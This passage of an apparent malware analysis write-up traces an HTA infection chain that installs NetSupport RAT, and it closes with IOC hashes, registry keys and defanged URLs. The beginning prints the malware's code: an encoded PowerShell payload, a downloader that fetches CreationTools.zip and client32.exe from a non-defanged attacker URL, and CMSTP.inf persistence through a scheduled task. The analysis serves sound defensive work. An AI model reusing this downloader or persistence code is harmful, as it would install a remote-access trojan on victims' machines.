        GUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAQgB5AFAAcgBvAHAAZQByAHQAeQBOAGEAbQBlAD0AJABUAHIAdQBlACkAXQBbAHMAdAByAGkAbgBnAF0AJABQAHIAbwBjAGUAcwBzAE4AYQBtAGUAKQBQAHIAbwBjAGUAcwBzAHsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnADsAVAByAHkAewAkAGgAdwBuAGQAI
        AA9ACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAJABQAHIAbwBjAGUAcwBzAE4AYQBtAGUAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQA7AH0AQwBhAHQAYwBoAHsAJABoAHcAbgBkAD0AJABuAHUAbABsADsAfQAkA
        GgAYQBzAGgAPQBAAHsAUAByAG8AYwBlAHMAcwBOAGEAbQBlAD0AJABQAHIAbwBjAGUAcwBzAE4AYQBtAGUAOwBIAHcAbgBkAD0AJABoAHcAbgBkADsAfQA7AE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFAAcwBPAGIAagBlAGMAdAAgAC0AUAByAG8AcABlAHIAdAB5ACAAJABoAGEAcwBoAH0AfQBmAHUAbgBjAHQAaQBvAG4AIABTAGUAd
        AAtAFcAaQBuAGQAbwB3AEEAYwB0AGkAdgBlAHsAWwBDAG0AZABsAGUAdABCAGkAbgBkAGkAbgBnACgAKQBdAFAAYQByAGEAbQAoAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQAsAFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAPQAkAFQAcgB1AGUAKQBdA
        FsAcwB0AHIAaQBuAGcAXQAkAE4AYQBtAGUAKQBQAHIAbwBjAGUAcwBzAHsAJABoAHcAbgBkAD0ARwBlAHQALQBIAHcAbgBkACAALQBQAHIAbwBjAGUAcwBzAE4AYQBtAGUAIAAkAE4AYQBtAGUAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAASAB3AG4AZAA7AFsAaQBuAHQAXQAkAGgAYQBuAGQAb
        ABlAD0AJABoAHcAbgBkADsAaQBmACgAJABoAGEAbgBkAGwAZQAgAC0AZwB0ACAAMAApAHsAWwB2AG8AaQBkAF0AWwBXAFAASQBBAC4AQwBvAG4AcwBvAGwAZQBVAHQAaQBsAHMAXQA6ADoAUABvAHMAdABNAGUAcwBzAGEAZwBlACgAJABoAGEAbgBkAGwAZQAsAFsAVwBQAEkAQQAuAEMAbwBuAHMAbwBsAGUAVQB0AGkAbABzAF0AOgA6AFcATQBfAEMASABBAFIALAAxA
        DMALAAwACkAfQAkAGgAYQBzAGgAPQBAAHsAUAByAG8AYwBlAHMAcwA9ACQATgBhAG0AZQA7AEgAdwBuAGQAPQAkAGgAdwBuAGQAfQA7AE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFAAcwBPAGIAagBlAGMAdAAgAC0AUAByAG8AcABlAHIAdAB5ACAAJABoAGEAcwBoAH0AfQA7AC4AIABTAGUAdAAtAEkATgBGAEYAaQBsAGUAOwBhAGQAZ
        AAtAHQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsASQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAEkAbgBmAEYAaQBsAGUATABvAGMAYQB0AGkAbwBuACkAewBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAYwBtAHMAdABwACAALQBBAHIAZwB1AG0AZQBuAHQATABpA
        HMAdAAgACIALwBhAHUAIAAiACIAJABJAG4AZgBGAGkAbABlAEwAbwBjAGEAdABpAG8AbgAiACIAIgAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAATQBpAG4AaQBtAGkAegBlAGQAOwBkAG8AewB9AHUAbgB0AGkAbAAoACgAUwBlAHQALQBXAGkAbgBkAG8AdwBBAGMAdABpAHYAZQAgAGMAbQBzAHQAcAApAC4ASAB3AG4AZAAgAC0AbgBlACAAMAApAH0ADQAKAA=='
        ))

        $UeUuQoZ = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($abmq))
        Powershell -WindowStyle hidden -ExecutionPolicy UnRestricted -Encoded $UeUuQoZ
        Start-Sleep 2
    }

}

function TPr($kdA)
{
    $wfM = New-Object Net.Webclient
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
    $Ogh = $wfM.DownloadData($kdA)
    return $Ogh
}
function WFf($CXi)
{
    $zVE=7413
    $IKW=$Null
    foreach($XAq in $CXi){$IKW+=[char]($XAq-$zVE)}
    return $IKW
}
function Syv()
{
    $WWC = $env:AppData + '\'
    $DcJWbg = $WWC + 'CreationTools.zip'
    if (Test-Path -Path $DcJWbg)
        {
            CheckPath_Unzip $DcJWbg
        }
    Else
        {
            $zipURL = TPr (https://alexiakombou.com/wp-content/uploads/2021/11/CreationTools.zip)
            WriteAllBytes $DcJWbg $zipURL
            CheckPath_Unzip $DcJWbg
        }
    
    $OVJxeN = $WWC + 'client32.exe'

    if (Test-Path -Path $OVJxeN)
        {
            CheckPath_Unzip $OVJxeN
        }
    Else
        {
            $aEGUpiuhjgBa = TPr (https://alexiakombou.com/wp-content/uploads/2021/11/client32.exe)
            WriteAllBytes $OVJxeN $aEGUpiuhjgBa
            CheckPath_Unzip $OVJxeN
        }


}
Syv
    </pre>
</details>

Function 1 simply writes all bytes supplied to it to a path also supplied to it.

[![7-31-23_13.png](/assets/images/7-31-23/7-31-23_13.png)](/assets/images/7-31-23/7-31-23_13.png)

Function 2 does a few things.

It takes a path in appdata, checks if it ends with '.zip' and if it does, it unzips the .zip, sets a variable to 1 and then deletes the zip file in appdata. 
If the filename does NOT end with '.zip', it checks if the previous variable is equal to 1, if it is, it moves the current file into the extracted zip folder path. It then converts some text to base64 and stores it in a variable. Then it take some base64 text and decodes it, concatenating it with the start of a powershell command. Finally it will convert all of this to base 64 and run it via powershell.

Whew that was a mouthful.

We'll come back to that script in a moment, let's finish checking the functions on the second script.

[![7-31-23_14.png](/assets/images/7-31-23/7-31-23_14.png)](/assets/images/7-31-23/7-31-23_14.png)

This first function is a wrapper to download a file.
The second is for converting the characters in the final function.

[![7-31-23_15.png](/assets/images/7-31-23/7-31-23_15.png)](/assets/images/7-31-23/7-31-23_15.png)

This final function sets variable for a zip file, then checks to see if that zip file exists. If it doesn't, it users the 2 previous functions to decode the url and download the zip.
Next it does the same for a .exe file.
Then it runs the final function.

In the Else statements we can see the large function come into play. Let's look at that tertiary script from earlier.

[![7-31-23_16.png](/assets/images/7-31-23/7-31-23_16.png)](/assets/images/7-31-23/7-31-23_16.png)

Loading user32.dll into memory

[![7-31-23_17.png](/assets/images/7-31-23/7-31-23_17.png)](/assets/images/7-31-23/7-31-23_17.png)

This function is designed to write contents to a custom .inf file, 'CMSTP.inf'.
Of note is the powershell command string, this will contain registry settings and scheduled task settings to run the 'client32.exe' file downloaded.

[![7-31-23_18.png](/assets/images/7-31-23/7-31-23_18.png)](/assets/images/7-31-23/7-31-23_18.png)

Finally, the script creates functions to get a handle to a running process, and then set the window to active, runs the first function, executes the inf file and then keeps it running if it is terminated.

CMSTP.inf is designed to be executed and run the encoded powershell command.

[![7-31-23_19-1.png](/assets/images/7-31-23/7-31-23_19-1.png)](/assets/images/7-31-23/7-31-23_19-1.png)

When run, this will run the following powershell

[![7-31-23_20-1.png](/assets/images/7-31-23/7-31-23_20-1.png)](/assets/images/7-31-23/7-31-23_20-1.png)

Effectively this will add the client32.exe to the registry, set it to launch via a scheduled task and then start the process.

So what is client32.exe?

[![7-31-23_19.png](/assets/images/7-31-23/7-31-23_19.png)](/assets/images/7-31-23/7-31-23_19.png)

Netsupport RAT!

And the zip folder was kind enough to inclued a .ini file with the C2 IP hardcoded for us

[![7-31-23_20.png](/assets/images/7-31-23/7-31-23_20.png)](/assets/images/7-31-23/7-31-23_20.png)

Using this, we can easily search our environment for this IP, and hashes from both client32.exe and CreationTools.zip. Luckily, Crowdstirke prevent this chain from fully executing at the .hta stage, and a search confirmed these files never made it to disk.


# IOCs:

Name                  | Sha256 Hash           |
--------------------- | --------------------- |
​En-Localer.hta        | 6318e4335b1098781e35d7464d20b7f92015e86f21c5aad3147e18d6bf9bba7d |
​silentupdater.lnk     | ​59b392a0ff9a3ff064b5a4ab90de5b68c758429280c612fd08f9399475d3108d |
silent.url            | ​508a5051f1e98822ae71f164700e9e5dc087cb6fbe7df1a7e9fd3403981bde84 |
​CMSTP.inf             | ​3e44025d47415dcb497c4f894f94263bf2658bb0c20bc43ca40950207794cf08 |
​CreationTools.zip     | ​c45bf5155cdd7c9a4017b818a54b332070121819a7866c58c3cfd9d684c13a20 |
​client32.exe	       | ​49a568f8ac11173e3a0d76cff6bc1d4b9bdf2c35c6d8570177422f142dcfdbe3 |



## Host based indicators:
### Directories:
C:\Users\USER\AppData\Roaming\CreativeTools

C:\Users\USER\Appdata\Local\Temp

### Registry Keys:
HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command -Value C:\Users\USER\AppData\Roaming\CreativeTools\client32.exe

## Network based indicators:

### TCP ports:
443

### URLs:
hxxps://alexiakombou[.]com/wp-content/uploads/2022/01/downloader(updchr(V104.215.214)silent.url

hxxps://alexiakombou[.]com/wp-content/uploads/2021/12/EN-localer.hta

185.252.179.64@80 hxxp://185.252.179.64/Downloads/silentupdater-chr(v105).lnk